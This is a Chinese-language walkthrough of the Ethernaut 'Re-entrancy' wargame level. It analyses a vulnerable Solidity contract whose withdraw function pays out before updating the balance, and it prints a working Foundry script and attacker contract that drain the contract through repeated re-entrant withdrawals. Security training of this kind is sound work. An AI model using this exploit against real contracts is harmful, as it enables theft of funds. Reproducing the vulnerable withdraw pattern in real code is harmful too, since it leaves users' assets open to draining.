# Level 10 - Re-entrancy
## 題目
[Re-entrancy](https://ethernaut.openzeppelin.com/level/0x2a24869323C0B13Dff24E196Ba072dC790D52479)

### 通關條件
這一關的目標是偷走合約的所有資產。

### 提示
- 沒被信任的(untrusted)合約可以在你意料之外的地方執行程式碼
- fallback 方法
- 拋出(throw)/恢復(revert) 的通知
### 合約內容
```solidity=
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```
## 解題
這題目標是偷走合約裡的所有資產，所以先找到可以轉帳的 function
 19 行的 `withdraw(uint256 _amount)` 中有使用 `msg.sender.call` 來轉帳：
```solidity=19
    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }
```
提款函示 `withdraw(uint256 _amount)` 的流程：
1. 確認你的餘額（`balances[msg.sender]`）是否大於轉出的金額（`_amount`）
2. 將金額轉至你的地址
3. 從你的餘額中扣除金額

那我們可以動手腳的地方，就是在第 2 步把錢轉給我們的時候。因為 Solidity 在轉錢到別的合約時，會觸發接受方合約的 `receive()` 或是 `payable fallbakc()`，所以我們只要在 `receive()` 中再次呼叫題目的 `withdraw(uint256 _amount)`就可以產生新的提款請求，且上一筆也還沒扣除金額；造成不斷提款的效果。攻擊合約如下（會先朝關卡轉進一些錢以通過餘額判斷）：

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.12;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/10_Re-entrancy.sol";

contract ExploitScript is Script {

    function run() external {
        vm.startBroadcast();

        ReEntrancyAttacker attacker = new ReEntrancyAttacker{value: 0.001 ether}(your_challenge_address);
        attacker.attack();

        vm.stopBroadcast();
    }
}

contract ReEntrancyAttacker {
    Reentrance public level10;

    constructor(address payable _challengeInstance) public payable {
        level10 = Reentrance(_challengeInstance);
    }

    function attack() external {
        level10.donate{value: 0.001 ether}(address(this));
        level10.withdraw(0.001 ether);
    }

    receive() external payable{
        level10.withdraw(0.001 ether);
    }
}
```

這種攻擊的思路有點像是 [Recursive Functions](https://www.geeksforgeeks.org/recursive-functions/) 的概念，讓合約不斷重複呼叫導致流程沒有照著預期進行，這種攻擊手法在智能合約中被稱做 **Reentrancy attacks**，關於這個攻擊手法更多詳細可以參考：
- [WTF Solidity 合约安全: S01. 重入攻击](https://github.com/AmazingAng/WTF-Solidity/tree/main/S01_ReentrancyAttack)
- [Reentrancy Attack in Smart Contracts](https://medium.com/chainwall-io/reentrancy-attack-in-smart-contracts-4837ed0f9d73)
- [Solidity by Example - Re-entrancy](https://solidity-by-example.org/hacks/re-entrancy/)